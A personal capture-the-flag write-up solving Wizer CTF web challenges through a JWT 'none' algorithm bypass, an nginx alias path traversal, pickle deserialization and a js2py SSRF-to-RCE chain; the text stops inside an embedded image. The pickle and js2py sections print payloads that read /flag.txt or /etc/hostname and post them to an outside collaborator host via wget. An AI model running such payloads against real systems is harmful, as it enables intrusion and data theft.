---
layout: post
title: Sam Wizer CTF
date: 2024-05-05 18:59 -0400
img_path: /assets/img/samWizerCTF/
published: true
categories: ["Web Challenge","Wizer CTF"]
tags: ["NodeJS", "JWT","Nginx Configuration","SQLi","Filter Bypass","SSRF to RCE"]
toc: true
---
# CTF Wizer Challenge
Well i ended on 33 place, I enjoy both practition and real challenges

## Practice Mode 
This was the practice exercise, which i manage to solve 3 of 6.

### **JWT Authentication**

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());
const SECRETKEY = process.env.SECRETKEY;

// Middleware to verify JWT token
// This API will be used by various microservices. These all pass in the authorization token.
// However the token may be in various different payloads.
// That's why we've decided to allow all JWT algorithms to be used.
app.use((req, res, next) => {
  const token = req.body.token;

  if (!token) {
    return res.status(401).json({ message: 'Token missing' });
  }

  try {
    // Verify the token using the secret key and support all JWT algorithms
    const decoded = jwt.verify(token, SECRETKEY, { algorithms: ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 
                                                                'RS512', 'ES256', 'NONE', 'ES384', 'ES512',
                                                                'PS256', 'PS384', 'PS512'] });
    
    req.auth = decoded;                                                                                                                      
    next();
  } catch (err) {
    return res.status(403).json({ message: 'Token invalid' }); 
  }
});
// API route protected by our authentication middleware
app.post('/flag', (req, res) => {
  if (req.auth.access.includes('flag')) {
    res.json({ message: 'If you can make the server return this message, then you've solved the challenge!'});
  } else {
    res.status(403).json({ message: '🚨 🚨 🚨 You've been caught by the access control police! 🚓 🚓 🚓' })
  }
});

app.listen(3000, () => {
  console.log(`Server is running on port 3000`);
});
```

Use of NONE algorithm as valid algorithm ``{"token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJhY2Nlc3MiOlsiZmxhZyJdfQ."}``

### **Nginx Configuration**

```conf
user  nginx;
worker_processes  1;
events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;

        location / {  # Allow the index.html file to be read
            root   /usr/share/nginx/html;
            index  index.html;
        }

        location /assets {  # Allow the assets to be read
            alias /usr/share/nginx/html/assets/;
        }

        location = /flag.html {  # The flag file is private
            deny all;
        }

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   /usr/share/nginx/html;
        }
    }
}
```

here if we select the Open payload in a separate tab we can se the nginx version 

![bum](image.png)

Lets try look at some vulns for this [nginx/1.15.8](https://snyk.io/test/docker/nginx%3A1.15.8) allow us using this path ``/assets../flag.html``. 

Check here on [hackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx) for more info

### **Recipe Book**

```javascript
const express = require('express');
const helmet = require('helmet');
const app = express();
const port = 80;
// Serve static files from the 'public' directory
app.use(express.static('public'));
app.use(
    helmet.contentSecurityPolicy({
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", ],
        styleSrc: ["'self'", "'unsafe-inline'", 'maxcdn.bootstrapcdn.com'],
        workerSrc: ["'self'"]
        // Add other directives as needed
      },
    })
  );
// Sample recipe data
const recipes = [
    {
        id: 1,
        title: "Spaghetti Carbonara",
        ingredients: "Pasta, eggs, cheese, bacon",
        instructions: "Cook pasta. Mix eggs, cheese, and bacon. Combine and serve.",
        image: "spaghetti.jpg"
    },
    {
        id: 2,
        title: "Chicken Alfredo",
        ingredients: "Chicken, fettuccine, cream sauce, Parmesan cheese",
        instructions: "Cook chicken. Prepare fettuccine. Mix with cream sauce and cheese.",
        image: "chicken_alfredo.jpg"
    },
    // Add more recipes here
];

// Enable CORS (Cross-Origin Resource Sharing) for local testing
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});

// Endpoint to get all recipes
app.get('/api/recipes', (req, res) => {
    res.json({ recipes });
});

app.listen(port, () => {
    console.log(`API server is running on port ${port}`);
});
```

Really don't know how to get an alert from this code. 
Have to look at the Front-end javascript files.


### **Profila Page** 

```python
from flask import Flask, request, render_template
import pickle
import base64

app = Flask(__name__, template_folder='templates')
real_flag = ''
with open('/flag.txt') as flag_file:
    real_flag = flag_file.read().strip()

class Profile:
    def __init__(self, username, email, bio):
        self.username = username
        self.email = email
        self.bio = bio

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        bio = request.form.get('bio')

        if username and email and bio:
            profile = Profile(username, email, bio)
            dumped = base64.b64encode(pickle.dumps(profile)).decode()
            return render_template('profile.html', profile=profile, dumped=dumped)    

    load_object = request.args.get('load_object')
    if load_object:
        try:
            profile = pickle.loads(base64.b64decode(load_object))
            return render_template('profile.html', profile=profile, dumped=load_object)
        except pickle.UnpicklingError as e:
            return f"Error loading profile: {str(e)}", 400

    return render_template('input.html')

@app.route('/submit_flag/<flag>', methods=['GET'])
def flag(flag):
    return real_flag if flag == real_flag else 'Not correct!'

if __name__ == '__main__':
    app.run(debug=True)
```

Seems a deserialization attacks. 

![Request](image-1.png)

If we check the base64 data 

![pickle](image-2.png)

we see the ``80 04 95``pattern that caracterize Pickel Protocol 4, default for python 3.8 
Need to exploit the ``picke.loads()``, for that use this code

```python
import pickle 
import base64 
import os 

class RCE:
    def __reduce__(self):
         return os.system, ("wget --post-data=$(cat /flag.txt) http://burp.oastify.com -O /dev/null",)

r = RCE()
p = pickle.dumps(r)
b = base64.b64encode(p)
```

![Pickle_Dangerous](image-3.png)

### **Hack The Admin**

```python
from flask import Flask, request, jsonify
from itertools import chain
from urllib.parse import unquote
from ast import literal_eval
import pyjsparser.parser
import js2py
import traceback
import requests

class Api:
    def hello(self, name):
       return f"Hello {name}"
    
    def eval_js(self, script, es6):
        js = requests.get(script).text
        return (js2py.eval_js6 if es6 else js2py.eval_js)(js)

app = Flask(__name__)
api = Api()
real_flag = ''
with open('/flag.txt') as flag_file:
    real_flag = flag_file.read().strip()

@app.route('/api/<func>', methods=['GET', 'POST'])
@app.route('/api/<func>/<args>', methods=['GET', 'POST'])
def rpc(func, args=""):
    try: # Setup and logging for security
        pyjsparser.parser.ENABLE_PYIMPORT = True
        ip = request.remote_addr
        client = ip if ip != '127.0.0.1' else ip.local
        app.logger.debug(f"Request coming from {client}")
        pyjsparser.parser.ENABLE_PYIMPORT = False
    except Exception as exc:
        jsonify(error=str(exc), traceback=traceback.format_exc()), 500

    args = unquote(args).split(",")
    print(args)
    if len(args) == 1 and not args[0]:
        args = []

    kwargs = {}
    for x, y in chain(request.args.items(), request.form.items()):
        kwargs[x] = unquote(y)

    try:
        response = jsonify(getattr(api, func)(
            *[literal_eval(x) for x in args],
            **{x: literal_eval(y) for x, y in kwargs.items()},
        ))
    except Exception as exc:
        response = jsonify(error=str(exc), traceback=traceback.format_exc()), 500
    return response

@app.route('/submit_flag/<flag>', methods=['GET'])
def flag(flag):
    return real_flag if flag == real_flag else 'Not correct!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
```

the function eval_js seems vulnerable to RCE, we need to point to a js script under our vps with the code to exfiltrate the flag.

```javascript
require('child_process').exec('wget --post-data=$(cat /flag.txt) http://burp.oastify.com -O /dev/null', function(error, stdout, stderr) { console.log(stdout) })
```

but i am getting an error ``require is not defined``, for js2py its not enable for security reason. 
Investigating we came to this [CVE-2023-0297](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)

```javascript
pyimport os; os.system("wget --post-data=$(cat /etc/hostname) http://burp.oastify.com -O /dev/null")
```

base on the post, this code shoud work, work if a test on my machine, but in the ctf server i just get 500 error 

![Error](image-4.png)

in my machine i got, i have python 3.11 and in the ctf server have python 3.8 

![interesting](image-5.png)

So what could be the intended solution ?

The reason because its not working is this code

```python
        pyjsparser.parser.ENABLE_PYIMPORT = True
        ip = request.remote_addr
        client = ip if ip != '127.0.0.1' else ip.local
        app.logger.debug(f"Request coming from {client}")
        pyjsparser.parser.ENABLE_PYIMPORT = False
```

The ENABLE_PYIMPORT variable allow us use ``pyimport os``.it will be enable if the request is made from localhost, so we need an SSRF. We already have the SSRF in the script variable, what about the server making a request to himself.

![GG](image-6.png)

on the my vps server i put this code because wget, curl and nslookup didn't work.

```javascript
pyimport os; os.popen('cat /flag.txt').read()
```

### **Evaluation Corp Certificate of Support**
```javascript
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const handlebars = require('express-handlebars');
const puppeteer = require('puppeteer');
const ssrfFilter = require('ssrf-req-filter');
const axios = require('axios');
const dns = require('dns');

// Use Handlebars as the view engine
app.engine('handlebars', handlebars.engine());
app.set('view engine', 'handlebars');
// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));
// Routes
app.get('/', (req, res) => {
    res.render('index');
});
app.post('/generate', async (req, res) => {
    const name = req.body.name;

    const data = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Evaluation Corp Certificate of Support</title>
        </head>
        <body style="font-family: Arial, sans-serif; text-align: center;">
            <div style="border: 2px solid #3498db; padding: 20px; max-width: 600px; margin: 0 auto;">
                <h1 style="color: #3498db;">Certificate of Support</h1>
                <p>This is to certify that</p>
                <h2 style="color: #333;">${name}</h2>
                <p>Has shown outstanding support and dedication to</p>
                <h3 style="color: #333;">Evil Corp</h3>
                <p>on this day,</p>
                <p style="color: #333;">${new Date('August 1, 2024').toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
                <p>By contributing their time and expertise, ${name} has made a significant impact on the success of Evil Corp.</p>
                <p>Thank you for your unwavering support.</p>
                <br>
                <p style="font-size: 18px;">Authorized Signature:</p>
                <img src="data:image/png;base64,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